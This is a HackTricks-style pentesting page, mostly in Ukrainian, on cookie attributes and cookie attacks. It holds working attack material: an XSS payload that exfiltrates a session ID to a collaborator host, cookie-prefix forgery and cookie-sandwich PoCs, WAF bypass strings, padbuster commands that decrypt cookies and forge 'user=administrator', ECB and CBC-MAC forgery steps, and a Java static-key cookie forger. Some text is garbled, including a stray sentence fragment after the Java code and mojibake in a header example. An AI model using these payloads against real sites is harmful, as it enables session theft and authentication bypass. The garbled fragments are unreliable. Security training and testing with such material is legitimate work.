# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Атрибути Cookie

Cookies мають кілька атрибутів, що контролюють їхню поведінку в браузері користувача. Нижче наведено огляд цих атрибутів у більш пасивному стилі:

### Expires and Max-Age

Дата закінчення терміну дії cookie визначається атрибутом `Expires`. Натомість атрибут `Max-age` задає час в секундах до видалення cookie. **Віддавайте перевагу `Max-age`, оскільки це сучасніша практика.**

### Domain

Хости, що мають отримувати cookie, вказуються атрибутом `Domain`. За замовчуванням це встановлюється на хост, який видав cookie, без включення його субдоменів. Однак якщо атрибут `Domain` встановлено явно, він також охоплює субдомени. Це робить вказання атрибуту `Domain` менш обмежувальним варіантом, корисним у сценаріях, коли потрібно спільне використання cookie між субдоменами. Наприклад, встановлення `Domain=mozilla.org` робить cookie доступними на його субдоменах, таких як `developer.mozilla.org`.

### Path

Атрибут `Path` вказує конкретний URL-шлях, який має бути присутнім у запитаному URL, щоб заголовок `Cookie` було надіслано. Цей атрибут розглядає символ `/` як роздільник директорій, дозволяючи співпадіння і в підкаталогах.

### Ordering Rules

Коли два cookie мають однакове ім'я, для відправки обирається той, який відповідає таким правилам:

- cookie, що відповідає найдовшому шляху у запитаному URL.
- останній встановлений cookie, якщо шляхи ідентичні.

### SameSite

- Атрибут `SameSite` визначає, чи надсилаються cookie у запитах, що походять із сторонніх доменів. Він пропонує три налаштування:
- **Strict**: забороняє надсилання cookie у сторонніх запитах.
- **Lax**: дозволяє надсилання cookie з GET-запитами, ініційованими сторонніми сайтами.
- **None**: дозволяє надсилання cookie з будь-якого стороннього домену.

Пам'ятайте, розуміння цих атрибутів під час налаштування cookie допоможе забезпечити їхню очікувану поведінку в різних сценаріях.

| **Тип запиту** | **Приклад коду**                   | **Cookies Sent When** |
| -------------- | ---------------------------------- | --------------------- |
| Link           | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender      | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET       | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST      | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe         | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX           | $.get("...")                       | NotSet\*, None        |
| Image          | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
A cookie with _**SameSite**_ attribute will **mitigate CSRF attacks** where a logged session is needed.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Notice that temporary, after applying this change, the **cookies without a SameSite** **policy** in Chrome will be **treated as None** during the **first 2 minutes and then as Lax for top-level cross-site POST request.**

## Флаги Cookie

### HttpOnly

Це забороняє клієнту отримувати доступ до cookie (наприклад через **Javascript**: `document.cookie`)

#### **Bypasses**

- Якщо сторінка повертає cookies у відповіді на запит (наприклад на сторінці **PHPinfo**), можливо використати XSS, щоб відправити запит на цю сторінку і **вкрасти cookies** з відповіді (див. приклад у [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Це можна обійти за допомогою **TRACE** **HTTP** запитів: якщо цей HTTP-метод доступний, відповідь від сервера відобразить надіслані cookies. Ця техніка називається **Cross-Site Tracking**.
- Сучасні браузери уникають цієї техніки, не дозволяючи відправляти TRACE-запити з JS. Однак були знайдені обхідні шляхи в специфічному ПЗ, наприклад відправка `\r\nTRACE` замість `TRACE` для IE6.0 SP2.
- Інший шлях — експлуатація zero/day вразливостей у браузерах.
- Можна **перезаписати HttpOnly cookies** шляхом виконання Cookie Jar overflow attack:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Можливо використати атаку [**Cookie Smuggling**](#cookie-smuggling) для ексфільтрації цих cookie
- Якщо будь-який серверний endpoint відображає сирий session ID у HTTP-відповіді (наприклад всередині HTML-коментаря або блоку відладки), можна обійти HttpOnly, використавши XSS-gadget для отримання цього endpoint, витягнення секрета за допомогою regex та ексфільтрації. Приклад патерну XSS payload:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

Запит буде **надсилати** cookie в HTTP‑запиті лише якщо запит передається через захищений канал (зазвичай **HTTPS**).

## Cookies Prefixes

Cookies prefixed with `__Secure-` are required to be set alongside the `secure` flag from pages that are secured by HTTPS.

For cookies prefixed with `__Host-`, several conditions must be met:

- They must be set with the `secure` flag.
- They must originate from a page secured by HTTPS.
- They are forbidden from specifying a domain, preventing their transmission to subdomains.
- The path for these cookies must be set to `/`.

It is important to note that cookies prefixed with `__Host-` are not allowed to be sent to superdomains or subdomains. This restriction aids in isolating application cookies. Thus, employing the `__Host-` prefix for all application cookies can be considered a good practice for enhancing security and isolation.

### Overwriting cookies

So, one of the protection of `__Host-` prefixed cookies is to prevent them from being overwritten from subdomains. Preventing for example [**Cookie Tossing attacks**](cookie-tossing.md). In the talk [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) it's presented that it was possible to set \_\_HOST- prefixed cookies from subdomain, by tricking the parser, for example, adding "=" at the beggining or at the beginig and the end...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Or in PHP it was possible to add **other characters at the beginning** of the cookie name that were going to be **replaced by underscore** characters, allowing to overwrite `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Abuse discrepancies between browser and server parsing by prepending a Unicode whitespace code point to the cookie name. The browser won’t consider the name to literally start with `__Host-`/`__Secure-`, so it allows setting from a subdomain. If the backend trims/normalizes leading Unicode whitespace on cookie keys, it will see the protected name and may overwrite the high-privilege cookie.

- PoC from a subdomain that can set parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Типова поведінка backend, яка дозволяє цю проблему:
- Фреймворки, які обрізають/нормалізують cookie-ключі. У Django, Python’s `str.strip()` видаляє широкий набір Unicode whitespace code points, через що ім'я нормалізується до `__Host-name`.
- Зазвичай обрізувані кодові точки включають: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Багато фреймворків обробляють дублікати імен cookie за принципом «останній перемагає», тому контрольоване атакуючим нормалізоване значення cookie перезаписує легітимне.

- Різниця між браузерами має значення:
- Safari блокує багатобайтові Unicode-пробіли в іменах cookie (наприклад, відкидає U+2000), але все ще дозволяє одно-байтові U+0085 та U+00A0, які багато backend-ів обрізають. Тестуйте в різних браузерах.

- Наслідки: Дозволяє перезаписувати `__Host-`/`__Secure-` cookies з менш довірених контекстів (субдоменів), що може призвести до XSS (якщо відображається), перезапису CSRF-токена та session fixation.

- Приклад — вигляд on-the-wire vs вигляд на сервері (U+2000 присутній в імені):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Багато бекендів розбивають/розбирають, а потім обрізають, внаслідок чого нормалізований `__Host-name` набуває значення атакуючого.

#### Застаріле `$Version=1` розбиття cookie на Java-бекендах (prefix bypass)

Деякі Java-стеки (наприклад, Tomcat/Jetty-style) все ще дозволяють застарілий розбір RFC 2109/2965, коли заголовок `Cookie` починається з `$Version=1`. Це може призвести до того, що сервер інтерпретує один рядок cookie як кілька логічних cookie і прийме підроблений запис `__Host-`, який спочатку був встановлений з піддомену або навіть через незахищене походження.

- PoC, що викликає застарілий розбір:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Чому це працює:
- Client-side prefix checks застосовуються під час set, але server-side legacy parsing пізніше розбиває й нормалізує заголовок, що обходить призначення гарантій префіксів `__Host-`/`__Secure-`.

- Де пробувати: Tomcat, Jetty, Undertow, або фреймворки, які ще шанують RFC 2109/2965 attributes. Комбінуйте з семантикою перезапису duplicate-name.

#### Duplicate-name last-wins overwrite primitive

Коли два cookies нормалізуються до однакового імені, багато бекендів (включаючи Django) використовують останнє входження. Після smuggling/legacy-splitting, що дає два `__Host-*` імені, керований атакуючим зазвичай перемагає.

#### Виявлення та інструменти

Використовуйте Burp Suite для перевірки цих умов:

- Спробуйте кілька провідних Unicode whitespace code points: U+2000, U+0085, U+00A0 і спостерігайте, чи обрізає бекенд і трактує ім'я як таке, що має префікс.
- Відправте `$Version=1` першим у Cookie header і перевірте, чи виконує бекенд legacy splitting/normalization.
- Спостерігайте вирішення ситуацій з duplicate-name (first vs last wins), інжектуючи два cookies, які нормалізуються до одного й того ж імені.
- Burp Custom Action для автоматизації цього: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Cookies Атаки

Якщо кастомний cookie містить чутливі дані — перевірте його (особливо якщо ви граєте в CTF), оскільки він може бути вразливим.

### Decoding and Manipulating Cookies

Чутливі дані, вбудовані в cookies, завжди слід ретельно перевіряти. Cookies, закодовані в Base64 або подібних форматах, часто можна декодувати. Ця вразливість дозволяє атакуючим змінювати вміст cookie і видавати себе за інших користувачів, кодувавши змінені дані назад у cookie.

### Session Hijacking

Ця атака включає крадіжку cookie користувача для несанкціонованого доступу до його облікового запису в застосунку. Використовуючи вкрадений cookie, атакуючий може видавати себе за легітимного користувача.

### Session Fixation

У цьому сценарії атакуючий обманом змушує жертву використовувати певний cookie під час входу. Якщо застосунок не призначає новий cookie при вході, атакуючий, маючи оригінальний cookie, може видавати себе за жертву. Ця техніка покладається на те, що жертва увійде з cookie, наданим атакуючим.

Якщо ви знайшли **XSS in a subdomain** або ви **control a subdomain**, читайте:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Тут атакуючий переконує жертву використовувати session cookie атакуючого. Жертва, вважаючи, що вона увійшла у власний обліковий запис, ненавмисно виконуватиме дії в контексті облікового запису атакуючого.

Якщо ви знайшли **XSS in a subdomain** або ви **control a subdomain**, читайте:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT), що використовуються в cookies, також можуть мати вразливості. Для детальної інформації про потенційні дефекти та способи їх експлуатації рекомендується перейти до пов’язаного документа з hacking JWT.

### Cross-Site Request Forgery (CSRF)

Ця атака примушує залогіненого користувача виконати небажані дії в веб‑застосунку, в якому він наразі автентифікований. Атакуючі можуть експлуатувати cookies, що автоматично додаються до кожного запиту до вразливого сайту.

### Empty Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Browsers permit the creation of cookies without a name, which can be demonstrated through JavaScript as follows:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Результат у відправленому заголовку cookie: `a=v1; test value; b=v2;`. Цікаво, що це дозволяє маніпулювати cookie, якщо встановлено cookie з порожнім іменем, потенційно контролюючи інші cookie шляхом встановлення порожнього cookie у конкретне значення:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Це призводить до того, що браузер надсилає заголовок cookie, який кожний веб‑сервер інтерпретує як cookie з іменем `a` і значенням `b`.

#### Chrome Bug: Unicode Surrogate Codepoint Issue

У Chrome, якщо Unicode surrogate codepoint є частиною set cookie, `document.cookie` пошкоджується і надалі повертає порожній рядок:
```js
document.cookie = "\ud800=meep"
```
У результаті `document.cookie` виводить порожній рядок, що вказує на постійне пошкодження.

#### Cookie Smuggling через проблеми парсингу

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Декілька веб‑серверів, зокрема від Java (Jetty, TomCat, Undertow) та Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), неправильно обробляють cookie strings через застарілу підтримку RFC2965. Вони читають значення cookie у подвійних лапках як одне значення, навіть якщо воно містить крапки з комою (;), які зазвичай мають розділяти key-value pairs:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Уразливості інжекції cookie

(Див. детальніше в [оригінальному дослідженні](https://blog.ankursundara.com/cookie-bugs/)) Неправильний парсинг cookie серверами, зокрема Undertow, Zope та тими, що використовують Python's `http.cookie.SimpleCookie` і `http.cookie.BaseCookie`, створює можливості для cookie injection attacks. Ці сервери некоректно розмежовують початок нових cookie, що дозволяє атакуючим підробляти cookie:

- Undertow очікує новий cookie одразу після значення в лапках без крапки з комою.
- Zope шукає кому, щоб почати парсинг наступного cookie.
- Класи cookie в Python починають парсити з символу пропуску.

Ця вразливість особливо небезпечна для веб-застосунків, що покладаються на cookie-based CSRF protection, оскільки вона дозволяє атакуючим інжектити підроблені CSRF-token cookie, потенційно обходячи заходи безпеки. Проблема посилюється через те, як Python обробляє дублікати імен cookie — останнє значення заміщує попередні. Це також викликає занепокоєння щодо `__Secure-` та `__Host-` cookie в ненадійних контекстах і може призвести до обходу авторизації, коли cookie передаються на back-end сервери, вразливі до підробки.

### Cookies $version

#### Обхід WAF

Згідно з [**цією статтею в блозі**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), можливо використати атрибут cookie **`$Version=1`**, щоб змусити бекенд використовувати стару логіку парсингу cookie через **RFC2109**. Більше того, інші значення, такі як **`$Domain`** і **`$Path`**, можна використовувати для зміни поведінки бекенда стосовно cookie.

#### Cookie Sandwich Attack

Згідно з [**цією статтею в блозі**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) можна використати cookie sandwich technique для крадіжки HttpOnly cookie. Ось вимоги та кроки:

- Знайти місце, де очевидно марний **cookie відображається у відповіді**
- **Створити cookie з ім'ям `$Version`** зі значенням `1` (можна зробити це через XSS з JS) з більш специфічним шляхом, щоб він отримав початкову позицію (деякі фреймворки, як python, цього кроку не потребують)
- **Створити cookie, який відображається в відповіді**, зі значенням, що залишає **відкриті подвійні лапки**, і з конкретним шляхом, щоб він розмістився в cookie db після попереднього (`$Version`)
- Потім легітимний cookie стане наступним у порядку
- **Створити фіктивний cookie, який закриває подвійні лапки** всередині свого значення

Таким чином cookie жертви потрапляє всередину нового cookie версії 1 і буде відображатися щоразу, коли він відображається.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### Обходи WAF

#### Cookies $version

Перегляньте попередній розділ.

#### Bypassing value analysis with quoted-string encoding

Такий парсинг означає розпакування ескейпованих значень всередині cookies, тому "\a" стає "a". Це може бути корисним для обходу WAFs, наприклад:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

У RFC2109 зазначено, що **кома може використовуватися як роздільник між значеннями cookie**. А також можна додавати **пробіли та табуляції перед і після знаку рівності**. Тому cookie на кшталт `$Version=1; foo=bar, abc = qux` не генерує cookie `"foo":"bar, admin = qux"`, а створює cookie `foo":"bar"` та `"admin":"qux"`. Зверніть увагу, що утворюються 2 cookie і що в admin були видалені пробіли перед і після знаку рівності.

#### Bypassing value analysis with cookie splitting

Нарешті, різні backdoors можуть об'єднати в один рядок різні cookie, передані в різних cookie headers, наприклад:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Що може дозволити обійти WAF, як у цьому прикладі:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Додаткові перевірки уразливих Cookies

#### **Базові перевірки**

- The **cookie** is the **same** every time you **login**.
- Log out and try to use the same cookie.
- Try to log in with 2 devices (or browsers) to the same account using the same cookie.
- Check if the cookie has any information in it and try to modify it
- Try to create several accounts with almost the same username and check if you can see similarities.
- Check the "**remember me**" option if it exists to see how it works. If it exists and could be vulnerable, always use the cookie of **remember me** without any other cookie.
- Check if the previous cookie works even after you change the password.

#### **Розширені атаки на cookie**

If the cookie remains the same (or almost) when you log in, this probably means that the cookie is related to some field of your account (probably the username). Then you can:

- Try to create a lot of **accounts** with usernames very **similar** and try to **guess** how the algorithm is working.
- Try to **bruteforce the username**. If the cookie saves only as an authentication method for your username, then you can create an account with username "**Bmin**" and **bruteforce** every single **bit** of your cookie because one of the cookies that you will try will the one belonging to "**admin**".
- Try **Padding** **Oracle** (ви зможете розшифрувати вміст cookie). Use **padbuster**.

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster зробить кілька спроб і запитає вас, яка умова є умовою помилки (та, яка недійсна).

Потім воно почне decrypting the cookie (це може зайняти кілька хвилин)

Якщо атаку виконано успішно, ви можете спробувати encrypt рядок на свій вибір. Наприклад, якщо ви хочете **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
This execution will give you the cookie correctly encrypted and encoded with the string **user=administrator** inside.

**CBC-MAC**

Можливо, cookie має деяке значення і може бути підписане з використанням CBC. Тоді цілісність значення — це підпис, створений за допомогою CBC над тим самим значенням. Оскільки часто для IV рекомендовано використовувати null vector, цей тип перевірки цілісності може бути вразливим.

**The attack**

1. Отримати підпис для username **administ** = **t**
2. Отримати підпис для username **rator\x00\x00\x00 XOR t** = **t'**
3. Встановити в cookie значення **administrator+t'** (**t'** буде дійсним підписом для **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**

**ECB**

If the cookie is encrypted using ECB it could be vulnerable.\
When you log in the cookie that you receive has to be always the same.

How to detect and attack:

- Create 2 users with almost the same data (username, password, email, etc.) and try to discover some pattern inside the given cookie

Створіть user'а, наприклад "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" і перевірте, чи є якийсь pattern у cookie (оскільки ECB шифрує кожен block тим самим ключем, однакові зашифровані байти можуть з'явитися, якщо username зашифровано).

There should be a pattern (with the size of a used block). So, knowing how are a bunch of "a" encrypted you can create a username: "a"\*(size of the block)+"admin". Then, you could delete the encrypted pattern of a block of "a" from the cookie. And you will have the cookie of the username "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Some applications mint authentication cookies by encrypting only a predictable value (e.g., the numeric user ID) under a global, hard-coded symmetric key, then encoding the ciphertext (hex/base64). If the key is static per product (or per install), anyone can forge cookies for arbitrary users offline and bypass authentication.

How to test/forge
- Identify the cookie(s) that gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Determine cipher/encoding. In one real-world case the app used IDEA with a constant 16-byte key and returned the ciphertext as hex.
- Verify by encrypting your own user ID and comparing with the issued cookie. If it matches, you can mint cookies for any target ID (1 often maps to the first admin).
- Set the forged value directly as the cookie and browse; no credentials are needed.

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>контекст (наприклад, серверна сесія з випадковим ID або додайте anti-replay properties).

## Посилання

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
